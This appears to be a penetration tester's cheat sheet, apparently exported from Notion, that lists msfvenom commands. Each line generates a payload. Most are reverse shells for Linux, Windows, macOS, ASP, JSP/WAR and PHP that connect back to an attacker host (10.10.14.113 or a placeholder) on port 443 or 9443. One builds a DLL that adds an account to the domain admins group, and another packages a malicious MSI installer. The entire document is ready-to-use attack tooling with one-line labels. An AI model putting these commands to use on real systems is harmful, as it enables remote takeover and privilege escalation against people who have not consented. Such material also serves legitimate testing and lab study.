# msfvenom examples

OS: Linux
Description: msfvenom payload examples
Security Domains: Resource Development (https://www.notion.so/Resource-Development-1444c8e523768023b086cae715467df4?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload` |
| --- | --- |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe` | MSFvenom command used to generate a Windows-based reverse shell stageless payload |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho` | MSFvenom command used to generate a MacOS-based reverse shell payload |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | MSFvenom command used to generate a ASP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp` | MSFvenom command used to generate a JSP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war` | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload |
| `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll` | Generate Malicious DLL |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate Reverse PHP Payload |
| `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi` | Generate Malicious .msi |